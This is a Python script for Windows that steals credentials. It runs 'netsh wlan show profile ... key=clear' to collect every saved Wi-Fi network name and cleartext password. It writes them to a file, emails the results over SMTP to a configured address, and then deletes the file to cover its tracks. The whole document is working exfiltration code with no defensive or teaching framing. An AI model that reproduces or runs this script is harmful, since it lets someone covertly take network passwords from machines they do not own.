import subprocess
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ==============================
# ==============================

#comment out these lines if you using gmail's app pasword feature

YOUR_USERNAME = "YOUR_MAILTRAP.IO_USERNAME" 
YOUR_PASSWORD = "YOUR_MAILTRAP.IO_PASSWORD" 
SMTP_SERVER = "smtp.mailtrap.io" 
SMTP_PORT = 2525

#uncomment these lines if you sending with gmail's app password feature

#YOUR_USERNAME = "YOUR_GMAIL_ADDRESS@gmail.com" 
#YOUR_PASSWORD = "YOUR_GMAIL_APP_PASSWORD" 
#SMTP_SERVER = "smtp.gmail.com"
#SMTP_PORT = 587

#secondary email sending (useful for gmail method)
sender_email = "YOUR_EMAIL@gmail.com"
receiver_email = "YOUR_EMAIL@gmail.com"

# ==============================
# ==============================

#active character encoding check on cmd with "chcp" command
def get_cmd_encoding():
    cp_output = subprocess.check_output("chcp", shell=True).decode()
    cp_number = cp_output.split(':')[1].strip().split(' ')[0]
    return f'cp{cp_number}'

cmd_encoding = get_cmd_encoding()

system_information = "system_info.txt"
file_path = os.getcwd()  #saving path


filtered_data = ""

try:
    #run the netsh command and decode the output with cmd's encoding 
    command_output_bytes = subprocess.check_output("netsh wlan show profile", shell=True)
    command_output = command_output_bytes.decode(cmd_encoding)
    
    profiles = [line.split(":")[1].strip() for line in command_output.split('\n') if "All User Profile" in line]
    
    with open(os.path.join(file_path, system_information), "w", encoding='utf-8') as f:
        for profile in profiles:
            try:
                #get profile information and decode with cmd's encoding
                wifi_data_bytes = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True)
                wifi_data = wifi_data_bytes.decode(cmd_encoding)
                
                #collect filtered data and add spaces for each profile
                profile_data = ""
                for line in wifi_data.split('\n'):
                    if "Key Content" in line or "SSID name" in line:
                        profile_data += line + '\n'
                if profile_data:
                    filtered_data += f"Profile: {profile}\n{profile_data}\n"
            
            except subprocess.CalledProcessError as e:
                print(f"Error processing profile {profile}: {e}")
        
        #write filtered data to file
        f.write(filtered_data)

except subprocess.CalledProcessError as e:
    print(f"Error while running the command: {e}")


#creating email content
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = "Wi-Fi Network Profiles - Filtered Information"

#add filtered content to email content
message.attach(MIMEText(filtered_data, "plain"))

#connect to smtp server and send the email
server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)  
server.starttls()
server.login(YOUR_USERNAME, YOUR_PASSWORD)
server.sendmail(sender_email, receiver_email, message.as_string())
server.quit()

#delete the file
os.remove(os.path.join(file_path, system_information))
